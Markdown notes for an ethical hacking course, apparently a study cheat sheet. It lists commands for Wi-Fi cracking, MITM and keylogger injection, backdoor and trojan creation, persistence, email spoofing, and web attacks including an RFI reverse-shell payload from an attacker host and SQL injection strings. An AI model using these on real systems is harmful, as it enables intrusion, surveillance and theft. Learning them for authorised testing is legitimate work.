# Ethical Hacking Course

Here are the commands that will be used in the course

[Fluxion](https://github.com/FluxionNetwork/fluxion)

[Airgeddon](https://github.com/v1s1t0r1sh3r3/airgeddon)

`apt-get install firmware-atheros`

# Network

A network is a group of devices that can communicate with each other. Generally, these devices are computers, cellphones, and printers. They can transfer data between them and access the internet through the router.

The router or access point (AP) is the only device on the network that can access the web, and it is the only one visible outside of the network. To communicate with the devices the information is sent as packets.

In the network, devices ensure that the packet is been sent to the right destination by adding the source and the destination MAC.

## MAC Address

MAC Address stands for Media Access Control and is a unique and permanent number assigned by the manufacturer for each network interface. It specifies the brand and the model of the device.

Because it is a unique number it can be traced. To to be anonymous it is a good idea to change the MAC.

* Get the interface down
  * `ifconfig wlan0 down`
* Use macchanger
  * `macchanger --random wlan0`
  * `ifconfig wlan0 hw ether 00:11:22:33:44:55`
* Get the interface up
  * `ifconfig wlan0 up`
  
## Wireless Card Mode

By default, each device on the network only receives packets that have its MAC as the destination MAC.

This is the Managed mode. But you can see and capture all packets that are been sent by changing this mode to Monitor.

### Method 1

* Start Monitor Mode
  * `airmon-ng start wlan0`
* Stop Monitor Mode
  * `airmon-ng stop wlan0mon`

### Method 2

* Get the interface down
  * `ifconfig wlan0 down`
* Change Mode
  * `iwconfig wlan0 mode monitor`
* Get the interface up
  * `ifconfig wlan0 up`

### Method 3

* Get the interface down
  * `ifconfig wlan0 down`
* Kill Process
  * `airmon-ng check kill`
* Start Monitor Mode
  * `airmon-ng start wlan0`
* Get the interface up
  * `ifconfig wlan0 up`
* Restart Network Manager
  * `service NetworkManager restart`

## Packet Sniffing

[Airodump-ng](https://www.aircrack-ng.org/doku.php?id=airodump-ng)

After changing the mode of the wireless adapter to Monitor, you are able to capture all packets sent around you.

Now you can see all the APs and clients around you, their channel and MAC addresses.

* Start Sniffing
  * `airodump-ng wlan0mon`
* Sniff In A Specific Network
  * `airodump-ng --channel <network channel> --bssid <network bssid> --write <file-name> wlan0mon`
* Deauth Attacks
  * `aireplay-ng --deauth <num-of-packets> -a <network bssid> -c <target bssid> wlan0mon`

## Crack WEP

WEP stands for Wired Equivalent Privacy and is an old encryption method that uses the RC4 algorithm to encrypt the packets. In this encryption method, the packet is encrypted with the key by the sender, and the receiver decrypts it.

Each packet sent has a unique keystream. A random initialization vector (IV) is added to the WEP key is used to create this keystream. Then this keystream is used to encrypt the packet.

This IV is sent in plain text with the packet for the receiver to decrypt it, and it is only 24-bits long.

### Busy Network

* Start airodump-ng in the target network
* Crack
  * `aircrack-ng <network-file>`

### NOT Busy Network (Packet Injection)

#### ARP Request Reply Attack

In this method, the attacker waits for an ARP packet, after capture it, he will inject it into the traffic, forcing the AP to generate a new ARP packet with a new IV. This process will be repeated until the number of captured IVs is enough to crack the WEP key.

* Sniff the packets on the target network
* Associate with the target network (tell the network that I want to connect to it)
  * `aireplay-ng --fakeauth 0 -a <network bssid> -h <wireless adapter MAC> wlan0mon`
* Packet Injection
  * `aireplay-ng --arpreplay -b <network bssid> -h <wireless adapter MAC> wlan0mon`
* Crack the key
  * `aircrack-ng <.cap file>`

#### Korek Chopchop Attack

With this method the attacker will capture an ARP packet and try to guess its keystream, then this will be used to forge a new packet that will be injected into the traffic to generate new IVs.

* Sniff the packets on the target network
* Associate with the target network
* Capture packets and determine its keystream
  * `aireplay-ng --chopchop -b <network bssid> -h <wireless adapter MAC> wlan0mon`
* Forge a fake packet
  * `packetforge-ng --arp -a <network bssid> -h <wireless adapter MAC> -k 255.255.255.255 -l 255.255.255.255 -y <keystream file> -w <forged packets file name>`
* Inject fake packets
  * `aireplay-ng --arpreplay -r <forged packets file name> wlan0mon`

#### Fragmentation Attack

In this method, the attacker will obtain 1500 bytes of the PRGA (Pseudo Random Generation Algorithm) that generates the keystreams. Then a keystream will be generated and will be used to forge packets that will be injected into the traffic.

* Sniff the packets on the target network
* Associate with the target network
* Obtain PRGA
  * `aireplay-ng --fragment -b <network bssid> -h <wireless adapter MAC> wlan0mon`
* Forge a fake packet
  * `packetforge-ng --arp -a <network bssid> -h <wireless adapter MAC> -k 255.255.255.255 -l 255.255.255.255 -y <keystream file> -w <forged packets file name>`
* Inject fake packets
  * `aireplay-ng --arpreplay -r <forged packets file name> wlan0mon`

## Crack WPA/WPA2

The successor of WEP is WPA, that stands for Wi-Fi Protected Access, and is much more secure than the other one.

WPA also uses the RC4 algorithm to encrypt the packets, but it uses TKIP (Temporal Key Integrity Protocol) to generate the keystreams. The IV of this method is larger and encrypted. This way each packet has its own key that is encrypted.

WPA2, on the other hand, uses the AES algorithm in combination with CCMP to ensure packet integrity.

### With WPS

WPS (Wi-Fi Protected Setup) is a method of authenticating with the router without entering the key. When the WPS button on the router and on the device that wants to connect to the network are pressed, an 8-bit pin is shared from the router to the device, and then it can connect.

A brute force attack can be used to get this pin and then get the WPA key.

* If wash is not working
  * `mkdir /etc/reaver`
* Check if the network has WPS
  * `wash -i wlan0mon`
* Associate with the target network with a delay of 30s
* Attack
  * `reaver -b <network bssid> -c <network channel> -i wlan0mon -vvv --no-associate`
* If you get an error get an [older version of reaver](https://files.fm/u/z5ha7t93)

### Without WPS

If the WPS is disabled or is configured to use push button authentication (PBC), then you will have to crack the WPA key.

Because the keystream is temporary we can't use it to crack the password. The only packets that contain useful information are the handshake packets.

Handshakes are four packets that are transferred between the client and the router when the client connects to the network.

To crack it you need to capture the handshake and a wordlist with all the possible passwords.

The Aircrack-ng tool combines each password in the wordlist with the AP name (ESSID) to compute a PMK (Pairwise Master Key) using the pbkdf2 algorithm. Then the PMK is compared to the one that is on the handshake file, if they match the cracking is done.

* Start airodump-ng in the target
* Deauth a client to capture the WPA Handshake
* Crack the Key
  * `aircrack-ng <handshake-file> -w <word-list>`

To automate this process you can convert the wordlist to a PMK list and, once you have the handshake, compare it with the one that is in the packet.

* Create a database and import the wordlist
  * `airolib-ng <db-name> --import passwd <wordlist>`
* Import target ESSID
  * `airolib-ng <db-name> --import essid <target ESSID>`
* Compute PMK from the wordlist
  * `airolib-ng <db-name> --batch`
*  Crack the key using the PMKs
  * `aircrack-ng -r <db-name> <handshake-file>`

### Create a Wordlist

`crunch <min-length> <max-length> <characters> -o <file-name> -t <pattern>`

## Information Gathering

After authenticating to a network you gather information about it. Discover which clients are connected, which ports are opened and what are the services running on that port.

### Using Netdiscover

* `netdiscover -r <network internal IP>.1/24 -i wlan0`

### Using Autoscan

* download [Autoscan](http://autoscan-network.com/download)
* add 32bit compatibility `dpkg --add-architecture i386`
* update `apt-get update`
* download and install library `apt-get install libc6:i386`
* install Autoscan in the terminal running `./<downaloaded file>`
* run Autoscan

### Using Nmap (Zenmap)

* run `zenmap`
* in Target put `<network internal IP>.1/24`
* play around with Profile

## Man In The Middle (MITM) Attacks

A MITM attack is simply someone in the middle of your connection with a client or a router. When packets are sent between these devices the MITM can capture all of them and read its content.

With all the attacks that intercept data from a client to a server, if it uses HTTPS you can't see the information because it is encrypted. And websites that have HSTS (HTTP Strict Transport Security) can't be downgraded to HTTP

### ARP Poisoning Using arpspoof

One method to become the MITM is to use ARP spoofing.

ARP stands for Address Resolution Protocol and it links the IPs of the clients on the network with their MACs.

The client sends an ARP request in the network looking for a certain IP. The client which has that IP send an ARP response which contains his MAC address.

Each computer has an ARP table containing IPs and MACs. But an ARP response can be sent without the need of its request. Therefore, the attacker can tell the target client that he is the router and tell the router that he is the target client, becoming the MITM.

* Tell the target client that I am the router
  * `arpsoof -i wlan0 -t <target client IP> <router IP>`
* Tell the router that I am the target client
  * `arpsoof -i wlan0 -t <router IP> <target client IP>`
* Enable IP forward to allow packets to flow through my device without being dropped
  * `echo 1 > /proc/sys/net/ipv4/ip_forward`

### ARP Poisoning Using MITMf

* Tell the target client that I am the router
  * `mitmf --arp --spoof --gateway <router IP> --target <target client IP> -i wlan0`

This way you can see all the post request made by the target client.

To bypass HTTPS request use SSLstrip to downgrade HTTPS to an HTTP request.

### Session Hijacking

If the user clicks on the "remember me" button a cookie is made in the browser. So we sniff the cookies and inject them to our browser.

* Install Ferret
  * `apt-get install ferret-sidejack`
* Become the MITM
* Capture Cookies
  * `ferret -i wlan0`
* Web GUI to see the cookies and inject them into my browser
  * `hamster`

### DNS Spoofing

* Start Apache Server
  * `service apache2 start`
  * The content of the page is in `/var/www/html`
* Edit DNS settings
  * `vim /etc/mitmf/mitmf.conf`
  * Edit the `A` record, that is responsible for translate names to IP adresses
* Become the MITM
  * `mitmf --arp --spoof --gateway <router IP> --target <target client IP> -i wlan0 --dns`

### Capture Screen & Injecting Keylogger

* Capture Screen
  * `mitmf --arp --spoof --gateway <router IP> --target <target client IP> -i wlan0 --screen`
* Injecting Keylogger
  * `mitmf --arp --spoof --gateway <router IP> --target <target client IP> -i wlan0 --jskeylogger`

### Code Injection

* Inject JS
  * `mitmf --arp --spoof --gateway <router IP> --target <target client IP> -i wlan0 --inject --js-payload "alert('hello from hacker')"`
  
### Fake Access Point (Honeypot) to become the MITM

If you are the router, or the AP, all the traffic goes through you, so you are the MITM and you can perform attacks on the clients.

#### Aircrack-ng

[Click here](https://github.com/RodgerOliver/ethical-hacking/blob/master/fake-ap-commands.txt) to see the commands to manually creta a fake AP using the Aircrack-ng suite.

#### Mana-Toolkit

This tool automatically creates an Access Point, it just needs to be configured.

It has 3 main scripts, **start-noupstream** which starts an AP with no internet connection, **start-nat-simple** which start an AP with internet and **start-nat-full** which start an AP with internet and also starts sslstrip, sslsplit, firelamp and attempts to bypass HSTS.

For this to work, you need a wireless adapter to broadcast the signal and a interface connected to the internet.

* Install Mana-Toolkit
  * `apt install mana-toolkit`
* Edit the files below. Change the interface and the ssid. Then, change the upstream (internet) and the phy (broadcaster).
  * `vim /etc/mana-toolkit/hostpad-mana.conf`
  * `vim /usr/share/mana-toolkit/run-mana/start-nat-simple.sh`
* Start the network
  * `bash /usr/share/mana-toolkit/run-mana/start-nat-simple.sh`

### Wireshark

Use Wireshark to sniff the traffic of a network card. If you are the MITM you can sniff the traffic of the target computer too.

# Gaining Access

## Server-Side Attacks

Don't require user interaction. All is needed is the target IP.
If you can ping the IP, go and hack it.

### Information Gathering
Scan the IP with Zenmap.

### Metasploit
Metasploit is an exploit development and execution tool.

It can also be used to carry out other penetration testing tasks such as port scans, service identification and post exploitation tasks.

Payloads are small pieces of code that will be executed on the target computer ounce the vulnerability has been exploited.

**Bind** payloads: open a port on the target computer and the attacker connects to that port.

**Reverse** payloads: open a port on the attacker computer and the target connects to that port. This allows to bypass firewalls.

* Run metasploit console
  * `msfconsole`
* Shows help
  * `help`
* Show exploits, payloads, auxiliaries or options
  * `show [option]`
* Use a certain exploit, payload or auxiliary
  * `use [module]`
* Configure [option] to have a value of [value]
  * `set [option] [value]`
* Run the current task
  * `exploit`

### Metasploit Community (MSFC)
Metasploit community is a GUI that can discover open ports and installed 
services on the target machine, not only that but it maps these services 
to metasploit modules and exploits and allow us to run these modules 
from the web GUI

To download it [click here](https://www.rapid7.com/products/metasploit/metasploit-community-registration.jsp)

* Start metasploit community
  * `systemctl start metasploit`
* Open the program
* Got to a browser and navigate to `https://localhost:3790`

Log in and put the activation key.

After the setup go to project, create a new project, scan the target and launch it. Then go on analysis, hosts, click on the IP, and play with the tabs.

### Nexpose
Nexpose is a vulnerability management framework, it allows us to 
discover, assess and act on discovered vulnerabilities, it also tells us a lot 
of info about the discovered vulnerabilities, whether they are exploitable 
and helps us write a report at the end of the assessment.

To download it [click here](http://www.rapid7.com/products/nexpose/compare-downloads.jsp)

* Stop postgresql
  * `systemctl stop postgresql`
* Got to the program directory
  * `cd /opt/rapid7/nexpose`
* Start the program
  * `./nsc/nsc.sh`
* Got to a browser and navigate to `https://localhost:3780`

Log in and put the activation key.

After the setup go to home, create, site, add a name, the IP in assets and a group, 
save & scan. Play with the tabs.

## Client-Side Attacks
If you can't ping the target IP or it's hidden behind a router use this attack.

It requires user interaction and Social Engineering is very important 
as well as information gathering.

### Veil
Veil is a framework for generating undetectable backdoors.
A backdoor is a file that gives full access over the machine that it gets executed on.

[Click here](https://github.com/Veil-Framework/Veil) and clone it.

#### Generate a backdoor for Windows
* Got to the Veil directory and set up the program
  * `./config/setup.sh --force --silent`
* Start the program
  * `Veil.py`
* See available tools
  * `list`
* Use Evasion to create an undetectable backdoor
  * `use 1`
* See available payloads
  * `list`
* Use a playload
  * use a `meterpreter/rev_http` payload
  * `use [payload number]`
* Configure the backdoor, set Lhost to your IP
  * `set [option] [value]`
  * `options`
* Make the backdoor
  * `generate`

Check if your backdoor is being detected by anti-virus by going to
[No Distribute](https://nodistribute.com/) and upload your file.

#### Generate a backdoor for Android

* `msfvenom -x [template.apk] -p android/meterpreter/[payload type(reverse_https)] LHOST=[attacker's IP] LPORT=[port] -o [file name.apk]`

### Listen for incomming connections

* Listen with metasploit
  * `msfconsole`
  * `use exploit/multi/handler`
  * `show options`
  * Set the correct the correct payload path, Lhost and Lport to your IP and the port to the port that your backdoor uses, and then exploit.

### Deliver the backdoor by a fake update

Fake an update for an already installed program.

Install backdoor instead of the update.

Requires DNS spoofing + Evilgrade (a server to serve the update).

* Install Evilgrade
* Check programs that can be hijacked
  * `show modules`
* Select a program
  * `configure [module]`
  * `show options`
* Set backdoor location and other options if you want
  * `set agent [backdoor location]`
* Start server
  * `start`
* Start dns spoofing and handler by setting any updates requests to evilgrade (your IP).

### Deliver the backdoor by backdooring downloads on the fly

Backdoor any .exe file that the target downloads using the Backdoor Factory Proxy (bdfproxy).

We need to be in the middle of the connection.

* Edit bdfproxy config file and set your IP address and proxy mode to transparent
  * ` vim /etc/bdfproxy/bdfproxy.cfg`
* Start bdfproxy
  * `bdfproxy`
* Redirect traffic to bdfoxy (the proxy is running on port 8080)
  * `iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080`
* Become the MITM
* Start listening for connections
  * `msfconsole -r /usr/share/bdfproxy/bdf_proxy_msf_resource.rc`

### Maltego - Social Engineering
Maltego is an information gathering tool that can be used to collect information about anything.
The target can be a website, company, person, and do on. You can discover entities 
associated with the target and everything will be displayed on a nice graph.

### Make a Trojan

A Trojan is a simple file that seems to be normal but has malicious code in it, in this case, a backdoor will be injected into this file.

The target will receive a file with a backdoor, when this file is opened the backdoor will be executed in the background.

This will be done with a download and execute script which will download the file and the backdoor.

In the script, change `url1` with the real file url and the `url2` with the backdoor url.

Then the script needs to be compiled with Autoit, software and programming language that the script was written in. Change the script extension to `.au3`. Select the source, destination, and icon for the backdoored file and convert it.

### Spoof File Extensions

To spoof file extensions use the Right-to-Left Override character. This way you can make a `.exe` file looks like a `.jpg` file.

Because some browsers are removing this character you can compress the file to keep the spoofed extension.

### Spoof Emails

Email spoofing is the ability to email someone with any email address.

This can be achieved using a trusted email service to send the email. You can use a web hosting account, create your mail server or use an SMTP server.

A good and free SMTP server is [Sendgrid](https://sendgrid.com). Sign up for the free plan, click in integrate using SMTP relay and generate a key.

Then use the program`sendemail` to send the spoofed email. The authentication will be done with the username and password generated by Sendgrid, put the from and to emails, the subject, message, and the header.

`sendemail -s [server:port] -xu [user] -xp [password] -f [from email] -t [to email] -u [subject] -m [message] -o message-header="From: [name] <email>"`

### BeEf

BeEF is a Browser Exploitation Framework that allows performing a number of attacks on a hooked target. To hook someone the target needs to load a hook script generated by BeEF.

Once you start BeEF a URL for the web interface will be shown as well as the hook script.

To hook someone you can use DNS spoofing, inject the hook.js file using MITM or Social Engineer.

When the target is hooked you can execute commands on the target browser. You can search for things to do in the `Commands` tab.

Note: some commands just work in `http` protocol.

## Post Exploitation

After the attacker gains access to the target computer, the attacker has full control over the computer, everything can be done.

### Meterpreter

* Get help
  * `help`
* Background current session
  * `background`
* List sesions
  * `sessions -l`
* Interact with a session
  * `sessions -i [session number]`
* Display system info
  * `sysinfo`
* Display interfaces info
  * `ipconfig`
  * `ifconfig`
* Show current user
  * `getuid`
* Download file
  * `download [file]`
* Upload file
  * `upload [file]`
* Execute file
  * `execute [file]`
* List processes
  * `ps`

### Migrate Process

When you hack into a device, it is a good idea to migrate the original process to a safer one like the `explorer` which is the graphical interface of Windows.

`migrate [PID]`

### Maintaining Access

#### Windows

* Method 1 - Using Veil
  * Instead of using `rev_http_service` module use `reverse_tcp_service` module.
  * But it does not always work.
* Method 2 - Using persistence module
  * In the meterpreter session run `run persistence -U -i [seconds] -p [port(80)] -r [attacker IP]`
  * This is detectable by Antiviruses.
* Method 3 - Metasploit + Veil
  * The backdoor will be injected as a service and the computer will try to connect to the attacker
  every time the target powers on his computer.
  * `use exploit/windows/local/persistence`
  * `options`
  * `set EXE_NAME browser`
  * `set SESSION [session number]`
  * `show advanced`
  * `set EXE::Custom [payload path]`
  * `exploit`
  * Now you just have to listen for incoming connections and a session will be opened.

#### Android

* Save this code as "persist.sh".

```
#!/bin/sh
while :
do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity
sleep 10
done
```
* If the device is rooted
  * `cd /etc/init.d`
* If the device is not rooted
  * `cd /storage`
* `upload persist.sh`
* `shell`
* `cd /storage`
* `sh persist.sh`

* If the device is not rooted the persistance of the backdoor will remain until a reboot of the android system.
* If the backdoor is closed the session is closed and the app must be iniciated again.
 
### Pivoting

Pivoting is the ability to use the infected machine to hack into other machines in its network.

To do this a route needs to be set up between the attacker and the target. Then the attacker will be able to attack the machines on the network.

* `use post/windows/manage/autoroute`
* `set SUBNET [target subnet]`
* `set SESSION [session id]`
* `exploit`

## Website Hacking

[Website Request](https://link.medium.com/jDR6sAyvxS)

A Website is a server that when accessed retrieves a web page.

When your browser requests a website, the URL is translated to an IP address by a DNS server, then the IP is sent back to your computer and then the computer will connect with the server and the server will give back a response for the computer.

There can be two types of IP addresses. When the server hosts only one website this site has a **dedicated IP**. When the server hosts various websites these sites have **shared IPs**.

To hack into a website you can use a server attack if the server has any vulnerability, a client attack in the admin of the website or a web application attack.

When a website uses a Shared Web Hosting plan, if a direct attack to the website fails you can attack the other websites and after accessing the server you can go to the target website.

### Information Gathering

**Information to be collected** 
* IP Address
* Domain name info
* Technologies used
* Other websites on the same server
* DNS records
* Sub-domains and unlisted files and directories

**Other tools to gather information**

[Whois Lookup](http://whois.domaintools.com/) to find info about the owner of the target.

[Netcraft Site Report](http://toolbar.netcraft.com/site_report?ur) to show technologies used on the target.

[Robtex DNS lookup](https://www.robtex.com) to show comprehensive info about the target website.

### Subdomains

A subdomain is a domain that is part of a larger domain. At `mail.google.com` , `mail` is the subdomain of `google.com`. Note that these are not shown in search engines. The root subdomain is `www`.

These subdomains can contain vulnerabilities that will allow hacking the website.

To find subdomains on the target use Knock.

* `git clone https://github.com/guelfoweb/knock.git`
* `cd knock/knockpy`
* `python knock.py [target website]`

### Find Files

To find files and directories on a web server use Dirb with a wordlist to brute force file and directory names that may be on the website.

* `dirb [target website]`

After that, analyze the files and look for something useful like `robots.txt` that tells search engines how to deal with the website, it usually contains hidden files.

### Vulnerabilities

#### File Upload

This vulnerability allows the client to upload ANY file, so you can upload a shell in a programming language that the server understands and get control over the target.

To generate a PHP shell, Weevely can be used, but you can upload any file like a meterpreter payloads.

* Generate the payload
  * `weevely generate [password] [file name]`
* Upload the file
* Start the payload
  * `weevely [file url] [password]`

#### Code Execution

This vulnerability allows the client to perform operating system code on the target server.

You can run a reverse connection code and run it on the server.

Input to make a Ping (ie)

`192.168.0.1; [any command]`

#### Local File Inclusion

This allows the client to read any file that is on the target server.

It can be seen in the url, if in it there is something like `https://website.com/upload/?page=index.php` it means that the website is accessing a file on the server, so you can type any path in there and get files.

To test it try to load the `passwd` file `https://website.com/upload/?page=../../../../etc/passwd`

If the server adds the `.php` at the end of the file automatically, like so `<?php “include/”.include($_GET['filename'].“.php”); 
?>`, then you can add `%00` to the end of the string to tell to the server to ignore anything after that.

#### Remote File Inclusion

If the server turned on the functions `allow_url_include` and `allow_url_fopen`, the attacker can upload any file from any 
server to the target.

For this to work, make a php file that gives you a reverse connection to the target and saves it as `.txt`. Then put this on your server, copy the link to the file and paste in the string like so `https://website.com/upload/?page=http://192.168.10.26/php-reverse.txt?`

### SQL Injection

SQL is the programming language for relational databases. A database is where data is stored, like username, emails and passwords.

**SQL Select Pattern**: `SELECT [columns] FROM [database].[table]`

#### Discovering SQL Injections (POST Method)

The most common places to find SQL vulnerabilities are input fields because the input passed there is execute on the server.

In a login form, for example, if there is a vulnerability in the code, you can login in the page, but you can execute SQL commands as well.

This a what a query looks like to login to retrieve information about the user that wants to login.

`SELECT * FROM accounts WHERE username='$username_input' AND password='$passwd_input'`

`*` means all columns.

To check if the website has this vulnerability try to put `'` (single quote) or `"` (double quote) in the inputs, if you get an error this website is vulnerable.

To test if the website executes queries type this in the password field:

`123456' AND 1=1#`. If this is the right password and you managed to login there is a SQL vulnerability.

`123456' AND 1=2#`. If this is the right password and you didn't login there is a SQL vulnerability as well.

You can use this pattern in any input field. Type something acceptable, type `'`, put a query and a comment sign (`#`).

The `#` sign was used to comment everything after it, so the statement will run `1=1` and stop.
Other signs like `--` and `%00` work too.

In this case, if you want to login without knowing the password, in the password field you could type: `anything' OR 1=1#`. This way if any of the statements are true it's gonna login, the password is wrong so it's false but `1=1` is true so you will be logged in.

You can login without even entering a password if you type this in the username field: `admin'#`.

#### GET Method

When the inputs are passed by GET Method they are sent in the URL like so: `https://page.com/login.php?username=hello&password=world`

So the variable `username` has a value of `hello` and `password` has a value of `world`. These variables are going to be passed to the server and run a SQL query, so you can inject code on them too.

It is important to note that when the code is been injected into the browser it has to be encoded because the URL only works with encoded characters. Search for a URL Encoder-Decoder to encode the signs that you pass to the URL.

You can also try to encode the code with HTML Entity Encoder Decoder.

`%20 = (space)`

`%23 = (#)`

You can inject the `ORDER BY [clause]` SQL command as well to order the table by column-number or column-name (clause),
this way you will know how many columns that table has. Inject it like so:

`https://page.com/login.php?username=hello' ORDER BY 1 %23&password=world`

To organize the code, the only part that will be written is going to be after the username (`hello'`) and before the `%23` sign.

Go and sort the numbers till you get the highest number possible without an error. This number will be the number of columns in the table.

#### Read Database Information

After identifying how many columns the table has, the next step is to build a query to get information about the database.

To be able to combine the result of `SELECT` statements use the operator `UNION`.

When the `UNION` operator is been used all columns have to be filled up in the `SELECT` statement,
so to retrieve information set the other to `null`.

At the example above, let's suppose that the number of columns is 5. So to get the columns with `UNION` put this in the URL:

`UNION SELECT 1,2,3,4,5`

Then try some MySQL functions in the column numbers:

`UNION SELECT 1,database(),user(),version(),5`

These function will retrieve the current database, user and version of the database respectively.

#### Find Database Tables

The `information_schema` database is a default database created by MySQL and it contains information about all other databases.

To get all the tables from that database perform:

`UNION SELECT null,table_name,null,null,null from information_schema.tables`

This will select the column `table_name` from the table `tables` of the database `information_schema`.

To get all the table names from a database perform:

`UNION SELECT null,table_name,null,null,null from information_schema.tables where table_schema='[database name]'`

To get the columns of a table from a database perform:

`UNION SELECT null,column_name,null,null,null from information_schema.columns where table_name='[table name]'`

To get content in the columns from a table from a database perform:

`UNION SELECT null,[column name],null,null,null from [table name]`

#### Read and Write Files On The Server

With these functions the database can read and write files on the server. To see it perform:

`UNION SELECT null,load_file('/etc/passwd'),null,null,null`

`UNION SELECT null,'anything to be written in the server',null,null,null into outfile '/var/www/html/file.txt'`

If you don't have permissions to write a file in that directory just write in another one.

#### Extract Data With SQLmap

SQLmap is a tool that automates the search for vulnerabilities on the target server.

Type `sqlmap --help` to see options and use these options to attack the server.

* Run SQLmap
  * `sqlmap -u "[target url]"`
* Get current databases
  * `sqlmap -u "[target url]" --dbs`
* Get current user
  * `sqlmap -u "[target url]" --current-user`
* Get current database
  * `sqlmap -u "[target url]" --current-database`
* Get tables
  * `sqlmap -u "[target url]" --tables -D [database name]`
* Get columns
  * `sqlmap -u "[target url]" --columns -T [table name] -D [database name]`
* Get data of the columns
  * `sqlmap -u "[target url]" --dump -T [table name] -D [database name]`

### Cross Site Scripting (XSS)

XSS is a type of vulnerability that allows an attacker to inject JavaScript code into a page. This code will not be executed on the server, because JavaScript is a client-side language, so the server will be the delivery agent of the code.

There are 3 main categories of XSS vulnerabilities, stored, reflected and DOM based.

#### Persistent/Stored

In this type of XSS, the script is stored on the server, it can be on the page or on the database. So whenever a client access that page the code will run.

This can be exploited by looking for a place where you can write something on the database like a comment box, sign up and sign in forms.

Write the script on those inputs and they will be stored in the database. Once the page loads the DB, the code will be executed.

#### Reflected

In this type, the code will be executed when the target user runs a specific URL created by the attacker.

To search this vulnerability look for URLs with parameters and try to inject the script into these parameters in various forms, encoding the characters and using HTML entities.

`https://page.com/search?name='Bob'`

`https://page.com/search?name='<script>alert("Bob 
is here")</script>'`

#### DOM Based

With his type of vulnerability, the code is executed on the client with no need to send it to the server.

### Zed Attack Proxy (ZAP)

ZAP is a tool that searches for vulnerabilities in web application.
